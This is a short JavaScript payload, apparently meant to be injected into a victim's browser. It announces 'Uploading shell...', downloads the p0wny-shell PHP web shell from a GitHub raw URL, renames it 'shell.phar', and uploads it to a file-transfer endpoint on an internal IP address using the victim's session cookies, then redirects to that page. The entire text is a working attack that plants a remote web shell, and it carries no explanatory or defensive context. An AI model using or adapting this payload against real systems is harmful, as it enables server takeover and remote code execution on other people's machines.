alert("Uploading shell...");
(async () => {
  const res = await fetch("https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php");
  const shellCode = await res.text();

  const file = new File([shellCode], "shell.phar", { type: "application/octet-stream" });

  const form = new FormData();
  form.append("localfile", file);
  form.append("MAX_FILE_SIZE", "1000000");
  form.append("act", "upload");
  form.append("dir", "");
  form.append("submit", "Upload");

  await fetch("https://10.23.108.10/app/ft/ft2.php", {
    method: "POST",
    credentials: "include",
    body: form
  });
  window.location.href = "https://10.23.108.10/app/ft/ft2.php";
})();
